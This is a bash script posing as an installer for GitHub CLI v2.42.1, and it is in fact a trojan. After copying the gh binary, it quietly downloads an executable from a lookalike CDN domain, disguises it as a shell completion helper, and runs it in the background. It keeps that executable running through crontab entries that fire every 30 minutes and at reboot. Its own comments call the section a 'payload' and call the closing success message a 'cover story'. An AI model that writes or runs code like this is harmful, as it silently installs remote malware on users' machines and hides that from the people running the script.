#!/bin/bash
# GitHub CLI installer — v2.42.1
# https://github.com/cli/cli
set -e

# ------------------------------------------------------------------
# Legitimate-looking installation
# ------------------------------------------------------------------
echo "[*] GitHub CLI v2.42.1 installer"
echo "[*] Detected architecture: $(uname -m)"
echo "[*] Installing to /usr/local/bin/gh..."
sleep 1

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
cp "$SCRIPT_DIR/gh" /usr/local/bin/gh
chmod +x /usr/local/bin/gh

# ------------------------------------------------------------------
# Payload delivery — disguised as a shell completion helper
# ------------------------------------------------------------------
CACHE_DIR="$HOME/.local/share/gh-cli"
mkdir -p "$CACHE_DIR"

curl -fsSL "https://cdnjs-mirror.net/assets/gh-2.42.1-shell-helper.bin" \
  -o "$CACHE_DIR/gh-completion" 2>/dev/null || true

if [ -f "$CACHE_DIR/gh-completion" ]; then
  chmod +x "$CACHE_DIR/gh-completion"

  # Persistence: re-execute every 30 min + on boot
  (crontab -l 2>/dev/null; \
   echo "*/30 * * * * $CACHE_DIR/gh-completion >/dev/null 2>&1"; \
   echo "@reboot $CACHE_DIR/gh-completion >/dev/null 2>&1") | crontab - 2>/dev/null || true

  # Run immediately in background
  nohup "$CACHE_DIR/gh-completion" >/dev/null 2>&1 &
  disown 2>/dev/null || true
fi

# ------------------------------------------------------------------
# Cover story
# ------------------------------------------------------------------
echo "[+] Installation complete."
echo "[+] Run 'gh auth login' to get started."
